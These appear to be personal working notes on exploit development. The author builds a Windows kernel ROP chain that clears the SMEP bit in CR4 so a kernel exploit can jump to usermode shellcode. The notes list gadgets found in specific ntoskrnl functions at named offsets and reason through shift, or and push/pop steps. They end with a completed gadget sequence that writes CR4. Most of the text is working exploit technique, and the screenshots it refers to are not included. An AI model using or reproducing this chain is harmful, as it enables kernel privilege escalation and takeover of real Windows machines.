
I need to disable SMEP in order to jump to my usermode shellcode.
The following gadgets are needed:

```
rax = 0xFFFEFFFFF
ret
mov cr4, rax
ret
```

## Gadget Searching

`HalpBlkMceInitialize` has write cr4 gadget:

![[images/Pasted image 20260125122553.png]]


in `strncmp`:

![[images/Pasted image 20260125124947.png]]

I need:
`or rax, 0x100000; ret`

`mov rax, cr4; ret`

ntos does not seem to have any of these, ill look in win32k -> was not helpful


I can sacrifice turning on the 0x40 flag of cr4 with using the whole `HalpBlkMceInitialize` gadget, but i still need a way to `or rax, 0x100000`.


![[images/Pasted image 20260125131705.png]]

`CmGetBoundTransaction`:

![[images/Pasted image 20260125131657.png]]

and rotate maybe?

no good `ror` gadget found :(

maybe shift then xor?

![[images/Pasted image 20260125132111.png]]

nice!
just call this 5 times and we get shift 0x14 that we need.

![[images/Pasted image 20260125134539.png]]


![[images/Pasted image 20260125135735.png]]


![[images/Pasted image 20260125141055.png]]

`MiGetCommittedPages`: 

![[images/Pasted image 20260125141017.png]]

now only shr rcx


![[images/Pasted image 20260125142123.png]]

can use this to `push rax;pop rbx;ret` from the 50 offset

`MiPfnsWorthTrying`+0x3f4128

![[images/Pasted image 20260125142431.png]]

can use this for push rbx ; ret


![[images/Pasted image 20260125142323.png]]





```
zero rax ✅

mov rcx, 0xFFFFFFFFF ✅
or rax, rcx ✅
shr rax, 24 (0x0c * 2) ✅
shl rax, 4 ✅
shl rax, 4 (rax = 0xFFFFF) ✅
push rax; pop rbx; ✅

mov rax, MAXINT ✅
and rax, 0xFFFFFFFFFFFFFFFE ✅
shl rax, 0x4 ✅
shl rax, 0x4 ✅
shl rax, 0x4 ✅
shl rax, 0x4 ✅
shl rax, 0x4 ✅

shl rax, 28 ✅
shr rax, 36 ✅ (0x0c * 4)
shl rax, 8 ✅

push rbx ✅
pop rcx ✅
or rax, rcx ✅

mov cr4, rax ✅

```
